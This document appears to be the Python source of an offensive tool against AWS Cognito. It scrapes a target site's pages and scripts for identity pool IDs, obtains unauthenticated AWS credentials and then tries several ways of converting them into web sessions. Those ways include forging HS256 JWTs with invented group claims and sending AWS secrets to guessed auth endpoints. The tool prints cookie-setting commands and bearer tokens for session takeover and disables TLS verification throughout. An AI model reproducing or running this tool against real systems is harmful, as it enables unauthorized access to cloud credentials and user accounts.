#!/usr/bin/env python3

import requests
import json
import xml.etree.ElementTree as ET
from datetime import datetime, timezone, timedelta
import re
from urllib.parse import urlparse, urljoin
import logging
from bs4 import BeautifulSoup
import boto3
import uuid
import argparse
import sys
import jwt
import base64
import urllib3
urllib3.disable_warnings()

class AWSCognitoAnalyzer:
    def __init__(self):
        self.session = requests.Session()
        self.logger = logging.getLogger('AWSCognitoAnalyzer')
        self.visited_urls = set()
        self.tokens = set()
        self.oauth_configs = {}

    def analyze_url(self, target_url):
        """Analyze a target URL for AWS Cognito configurations"""
        self.logger.info(f"Starting comprehensive analysis of: {target_url}")
        
        try:
            parsed_url = urlparse(target_url)
            if not parsed_url.scheme:
                target_url = f"https://{target_url}"
                
            base_url = target_url.rstrip('/')
            all_findings = {}
            
            # First check base URL
            base_findings = self._analyze_single_url(base_url)
            if base_findings:
                all_findings[base_url] = base_findings
                
            # Then check for JavaScript files
            js_findings = self._analyze_js_references(base_url)
            if js_findings:
                all_findings[f"{base_url}_js"] = js_findings
                
            return all_findings if all_findings else None
            
        except Exception as e:
            self.logger.error(f"Error analyzing URL: {str(e)}")
            return None

    def _analyze_single_url(self, url):
        """Analyze a single URL for AWS configurations"""
        if url in self.visited_urls:
            return None
            
        self.visited_urls.add(url)
        self.logger.debug(f"Analyzing URL: {url}")
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            response = self.session.get(url, headers=headers, verify=False, timeout=10)
            self.logger.debug(f"Response status: {response.status_code}")
            
            findings = self._extract_aws_configs(response.text)
            if findings:
                self.logger.info(f"Found AWS configurations in {url}")
                return findings
                
        except Exception as e:
            self.logger.error(f"Error analyzing {url}: {str(e)}")
            
        return None

    def _analyze_js_references(self, url):
        """Analyze JavaScript files referenced in the page"""
        try:
            response = self.session.get(url, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            findings = {}
            for script in soup.find_all('script', src=True):
                js_url = urljoin(url, script['src'])
                if js_url not in self.visited_urls:
                    self.logger.debug(f"Analyzing JS file: {js_url}")
                    js_findings = self._analyze_single_url(js_url)
                    if js_findings:
                        findings[js_url] = js_findings
            
            return findings if findings else None
            
        except Exception as e:
            self.logger.error(f"Error analyzing JS files: {str(e)}")
            return None

    def _extract_aws_configs(self, content):
        """Extract AWS configurations from content"""
        if not content:
            return None
            
        patterns = {
            'identity_pool_id': r'(?:aws_cognito_identity_pool_id|identityPoolId|cognitoIdentityPoolId)["\']?\s*(?::|=)\s*["\']([^"\']+)',
            'user_pool_id': r'(?:userPoolId|aws_user_pools_id)["\']?\s*(?::|=)\s*["\']([^"\']+)',
            'client_id': r'(?:userPoolWebClientId|client-id|clientId)["\']?\s*(?::|=)\s*["\']([^"\']+)',
            'region': r'(?:aws_cognito_region|region)["\']?\s*(?::|=)\s*["\']([^"\']+)',
            'rum_role': r'(?:RoleArn=|roleArn"|roleArn=|role-arn)["\']?([^"\'&]+)'
        }
        
        results = {}
        for key, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                results[key] = matches[0]
                self.logger.debug(f"Found {key}: {matches[0]}")
                
        return results if results else None

class WebSessionManager:
    def __init__(self, base_url):
        self.base_url = base_url.replace("_js", "") # Fix URL issue
        self.session = requests.Session()
        self.logger = logging.getLogger('WebSessionManager')

    def test_session(self, session_data):
        """Test if a web session is valid"""
        results = {}
        
        common_endpoints = [
            '/api/user/profile',
            '/api/me',
            '/api/account',
            '/dashboard',
            '/home'
        ]
        
        for endpoint in common_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            try:
                headers = {}
                if 'token' in session_data:
                    headers['Authorization'] = f'Bearer {session_data["token"]}'
                
                cookies = session_data.get('cookies', {})
                
                response = requests.get(url, headers=headers, cookies=cookies, verify=False)
                
                if response.status_code == 200:
                    results[endpoint] = {
                        'status': response.status_code,
                        'content_type': response.headers.get('content-type'),
                        'body_preview': response.text[:200]
                    }
                    
            except Exception as e:
                self.logger.debug(f"Test failed for {endpoint}: {str(e)}")
                
        return results if results else None

class AWSIdentityValidator:
    def __init__(self, base_url):
        self.session = requests.Session()
        self.logger = logging.getLogger('AWSIdentityValidator')
        self.web_session_manager = WebSessionManager(base_url)
        self.base_url = base_url.replace("_js", "") # Fix URL issue

    def validate_identity_pool(self, identity_pool_id, region=None):
        """Attempt to get identity credentials"""
        try:
            # Try to extract region from pool ID if not provided
            if not region and ':' in identity_pool_id:
                region = identity_pool_id.split(':')[0]
                self.logger.debug(f"Extracted region from pool ID: {region}")

            regions_to_try = [region] if region else ['us-west-2', 'us-east-1', 'us-east-2', 'eu-west-1']
            
            for try_region in regions_to_try:
                try:
                    client = boto3.client('cognito-identity', region_name=try_region)
                    identity_response = client.get_id(
                        IdentityPoolId=identity_pool_id,
                        Logins={}  # Try unauthenticated access first
                    )
                    
                    if 'IdentityId' in identity_response:
                        self.logger.info(f"Successfully obtained Identity ID")
                        return identity_response
                        
                except Exception as e:
                    self.logger.debug(f"Failed in region {try_region}: {str(e)}")
                    continue
                    
        except Exception as e:
            self.logger.error(f"Error validating identity pool: {str(e)}")
            
        return None

    def get_credentials_for_identity(self, identity_id, region='us-west-2'):
        """Get AWS credentials for identity"""
        try:
            client = boto3.client('cognito-identity', region_name=region)
            creds_response = client.get_credentials_for_identity(
                IdentityId=identity_id
            )
            
            if 'Credentials' in creds_response:
                return creds_response['Credentials']
            
        except Exception as e:
            self.logger.error(f"Error getting credentials: {str(e)}")
        return None

    def try_web_session_conversion(self, identity_id, credentials):
        """Try all known methods to convert to web session"""
        results = {}
        
        # Method 1: Try SDK token exchange
        try:
            aws_auth_headers = {
                'Authorization': f'AWS4-HMAC-SHA256 Credential={credentials.get("AccessKeyId")}',
                'X-Amz-Security-Token': credentials.get('SessionToken'),
                'X-Amz-Access-Key-Id': credentials.get('AccessKeyId'),
                'X-Amz-Secret-Key': credentials.get('SecretKey')
            }
            
            # Try SDK token exchange endpoints
            sdk_endpoints = [
                '/.cognito/identity/authorize',
                '/.cognito/oauth2/token',
                '/.cognito/token',
                '/oauth2/token'
            ]
            
            for endpoint in sdk_endpoints:
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = requests.post(url, headers=aws_auth_headers, verify=False)
                    if response.status_code in [200, 302]:
                        results['sdk_token'] = {
                            'endpoint': endpoint,
                            'cookies': dict(response.cookies),
                            'headers': dict(response.headers)
                        }
                        break
                except Exception as e:
                    self.logger.debug(f"SDK endpoint {endpoint} failed: {str(e)}")
        except Exception as e:
            self.logger.debug(f"SDK token exchange failed: {str(e)}")

        # Method 2: Try Cognito hosted UI with credentials
        try:
            # Get OIDC configuration
            config_url = urljoin(self.base_url, '/.well-known/openid-configuration')
            config_response = requests.get(config_url, verify=False)
            
            if config_response.status_code == 200:
                config = config_response.json()
                authorize_endpoint = config.get('authorization_endpoint')
                
                if authorize_endpoint:
                    auth_params = {
                        'client_id': 'aws-cognito',
                        'response_type': 'token',
                        'scope': 'openid profile',
                        'nonce': str(uuid.uuid4()),
                        'state': str(uuid.uuid4()),
                        'identity_id': identity_id,
                        'aws_credentials': json.dumps({
                            'AccessKeyId': credentials.get('AccessKeyId'),
                            'SecretKey': credentials.get('SecretKey'),
                            'SessionToken': credentials.get('SessionToken')
                        })
                    }
                    
                    auth_response = requests.get(authorize_endpoint, params=auth_params, allow_redirects=False, verify=False)
                    if auth_response.status_code in [302, 200]:
                        results['hosted_ui'] = {
                            'location': auth_response.headers.get('Location'),
                            'cookies': dict(auth_response.cookies)
                        }
        except Exception as e:
            self.logger.debug(f"Hosted UI flow failed: {str(e)}")

        # Method 3: Try AWS Web Identity Flow
        try:
            # Get STS credentials
            sts_client = boto3.client('sts',
                aws_access_key_id=credentials.get('AccessKeyId'),
                aws_secret_access_key=credentials.get('SecretKey'),
                aws_session_token=credentials.get('SessionToken')
            )
            
            # Get caller identity
            caller = sts_client.get_caller_identity()
            assumed_role_arn = caller['Arn']
            
            # Try exchanging role info for session
            auth_url = urljoin(self.base_url, '/api/auth/aws')
            headers = {
                'Content-Type': 'application/json',
                'X-AWS-ARN': assumed_role_arn
            }
            
            role_response = requests.post(auth_url, 
                headers=headers,
                json={'role_arn': assumed_role_arn},
                verify=False
            )
            
            if role_response.status_code == 200:
                results['role_exchange'] = {
                    'cookies': dict(role_response.cookies),
                    'headers': dict(role_response.headers),
                    'response': role_response.json() if role_response.text else None
                }
        except Exception as e:
            self.logger.debug(f"Role exchange failed: {str(e)}")

        # Method 4: Try Browser SDK flow
        try:
            js_params = {
                'identityId': identity_id,
                'accessKeyId': credentials.get('AccessKeyId'),
                'secretKey': credentials.get('SecretKey'),
                'sessionToken': credentials.get('SessionToken'),
                'region': 'us-west-2'
            }
            
            # Emulate browser SDK calls
            auth_url = urljoin(self.base_url, '/api/auth/session')
            sdk_response = requests.post(auth_url, json=js_params, verify=False)
            
            if sdk_response.status_code == 200:
                results['browser_sdk'] = {
                    'cookies': dict(sdk_response.cookies),
                    'headers': dict(sdk_response.headers),
                    'response': sdk_response.json() if sdk_response.text else None
                }
        except Exception as e:
            self.logger.debug(f"Browser SDK flow failed: {str(e)}")

        # Method 5: Try JWT token exchange
        try:
            jwt_headers = {
                'Content-Type': 'application/json',
                'X-Identity-Token': credentials.get('SessionToken')
            }

            jwt_payload = {
                'sub': identity_id,
                'iss': self.base_url,
                'aud': 'aws-cognito',
                'token_use': 'access',
                'auth_time': int(datetime.utcnow().timestamp()),
                'exp': int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
                'iat': int(datetime.utcnow().timestamp()),
                'jti': str(uuid.uuid4()),
                'client_id': 'aws-cognito',
                'username': identity_id,
                'cognito:groups': ['aws-identity'],
                'aws:credentials': {
                    'AccessKeyId': credentials.get('AccessKeyId'),
                    'SecretKey': credentials.get('SecretKey'),
                    'SessionToken': credentials.get('SessionToken')
                }
            }

            # Try signing with different keys
            signing_keys = [
                credentials.get('SecretKey'),
                base64.b64encode(credentials.get('SecretKey', '').encode()).decode(),
                credentials.get('SessionToken')
            ]

            for key in signing_keys:
                try:
                    token = jwt.encode(jwt_payload, key, algorithm='HS256')
                    jwt_headers['Authorization'] = f'Bearer {token}'
                    
                    # Try JWT token endpoints
                    jwt_endpoints = ['/api/auth/jwt', '/api/auth/token', '/auth/jwt']
                    
                    for endpoint in jwt_endpoints:
                        jwt_url = urljoin(self.base_url, endpoint)
                        jwt_response = requests.post(jwt_url, headers=jwt_headers, verify=False)
                        
                        if jwt_response.status_code == 200:
                            results['jwt_exchange'] = {
                                'endpoint': endpoint,
                                'token': token,
                                'cookies': dict(jwt_response.cookies),
                                'headers': dict(jwt_response.headers)
                            }
                            break
                except:
                    continue
        except Exception as e:
            self.logger.debug(f"JWT exchange failed: {str(e)}")

        # Method 6: Try direct API access with credentials
        try:
            api_headers = {
                'X-Amz-Security-Token': credentials.get('SessionToken'),
                'X-Amz-Access-Key-Id': credentials.get('AccessKeyId'),
                'X-Amz-Secret-Access-Key': credentials.get('SecretKey'),
            }
            
            api_endpoints = ['/api/auth', '/api/v1/auth', '/api/session']
            
            for endpoint in api_endpoints:
                try:
                    api_url = urljoin(self.base_url, endpoint)
                    api_response = requests.post(api_url, headers=api_headers, verify=False)
                    
                    if api_response.status_code == 200:
                        results['api_access'] = {
                            'endpoint': endpoint,
                            'cookies': dict(api_response.cookies),
                            'headers': dict(api_response.headers)
                        }
                        break
                except Exception as e:
                    self.logger.debug(f"API access failed for {endpoint}: {str(e)}")
        except Exception as e:
            self.logger.debug(f"API access failed: {str(e)}")
            
        # Log debug info for manual investigation
        self.logger.debug("Debug Info:")
        self.logger.debug(f"Identity ID: {identity_id}")
        self.logger.debug(f"Access Key: {credentials.get('AccessKeyId')}")
        self.logger.debug(f"Assumed Role: {caller['Arn'] if 'caller' in locals() else 'Unknown'}")
        
        return results if results else None

def process_aws_configs(configs, analyzer):
    """Process discovered AWS configurations"""
    if not configs:
        return None
        
    # Find the base URL from configs
    base_url = None
    for url in configs.keys():
        if url.startswith('http'):
            base_url = url.replace("_js", "")  # Fix URL issue
            break
            
    if not base_url:
        return None
        
    validator = AWSIdentityValidator(base_url)
    results = {
        "identity_pools": [],
        "validations": [],
        "web_sessions": []
    }
    
    # Extract unique identity pools
    for url_data in configs.values():
        if isinstance(url_data, dict):
            for url_configs in url_data.values():
                if isinstance(url_configs, dict):
                    if 'identity_pool_id' in url_configs:
                        pool_id = url_configs['identity_pool_id']
                        if pool_id not in results['identity_pools']:
                            results['identity_pools'].append(pool_id)
    
    # Validate each identity pool
    for pool_id in results['identity_pools']:
        print(f"\nValidating Identity Pool: {pool_id}")
        validation_result = validator.validate_identity_pool(pool_id)
        
        if validation_result and 'IdentityId' in validation_result:
            identity_id = validation_result['IdentityId']
            print(f"Got Identity ID: {identity_id}")
            
            # Get AWS credentials
            credentials = validator.get_credentials_for_identity(identity_id)
            if credentials:
                print("Successfully obtained AWS credentials")
                
                # Try web session conversion
                print("\nAttempting web session conversion...")
                web_sessions = validator.try_web_session_conversion(identity_id, credentials)
                
                if web_sessions:
                    print("Successfully obtained web sessions!")
                    print("\nWeb Session Details:")
                    for method, session in web_sessions.items():
                        print(f"\nMethod: {method}")
                        if 'cookies' in session:
                            print("\nCookie Commands:")
                            for cookie_name, cookie_value in session['cookies'].items():
                                print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
                        if 'token' in session:
                            print(f"\nAuthorization: Bearer {session['token']}")
                        
                    results['web_sessions'].append({
                        'identity_pool_id': pool_id,
                        'identity_id': identity_id,
                        'sessions': web_sessions
                    })
                else:
                    print("Failed to convert to web session")
                    print("\nDebug Information:")
                    print(f"Identity ID: {identity_id}")
                    print(f"Access Key ID: {credentials.get('AccessKeyId')}")
                    print(f"Session Token Length: {len(credentials.get('SessionToken', ''))}")
                
                results['validations'].append({
                    'type': 'identity_pool',
                    'id': pool_id,
                    'identity_id': identity_id,
                    'credentials': credentials
                })
            else:
                print("Failed to get AWS credentials")
    
    return results

def main():
    parser = argparse.ArgumentParser(description="Advanced AWS Cognito Analyzer")
    parser.add_argument('-u', '--url', help="Target URL to analyze")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose logging")
    parser.add_argument('-o', '--output', help="Output file for results")
    parser.add_argument('--insecure', action='store_true', help="Skip SSL verification")
    parser.add_argument('--creds', help="Use existing AWS credentials (AccessKey:SecretKey:SessionToken)")
    parser.add_argument('--identity', help="Use existing Identity ID")
    args = parser.parse_args()

    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    if not args.url:
        parser.print_help()
        sys.exit(1)

    # Disable SSL warnings if using insecure mode
    if args.insecure:
        urllib3.disable_warnings()

    # If credentials are provided directly
    if args.creds and args.identity:
        access_key, secret_key, session_token = args.creds.split(':')
        credentials = {
            'AccessKeyId': access_key,
            'SecretKey': secret_key,
            'SessionToken': session_token
        }
        
        validator = AWSIdentityValidator(args.url)
        web_session = validator.try_web_session_conversion(args.identity, credentials)
        
        if web_session:
            print("\nSuccessfully converted credentials to web session!")
            for method, session in web_session.items():
                print(f"\nMethod: {method}")
                if 'cookies' in session:
                    print("\nCookie Commands:")
                    for cookie_name, cookie_value in session['cookies'].items():
                        print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
                if 'token' in session:
                    print(f"\nAuthorization: Bearer {session['token']}")
            
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(web_session, f, indent=2, default=str)
                print(f"\nResults saved to {args.output}")
            sys.exit(0)

    # Full analysis mode
    analyzer = AWSCognitoAnalyzer()
    configs = analyzer.analyze_url(args.url)
    
    if configs:
        print("\nDiscovered AWS configurations:")
        print(json.dumps(configs, indent=2))
        
        print("\nAttempting to validate configurations and obtain web sessions...")
        results = process_aws_configs(configs, analyzer)
        
        if results:
            print("\nValidation Results:")
            print(json.dumps(results, indent=2, default=str))
            
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(results, f, indent=2, default=str)
                print(f"\nResults saved to {args.output}")
        else:
            print("No successful validations")
    else:
        print("No AWS configurations found.")

if __name__ == "__main__":
    main()
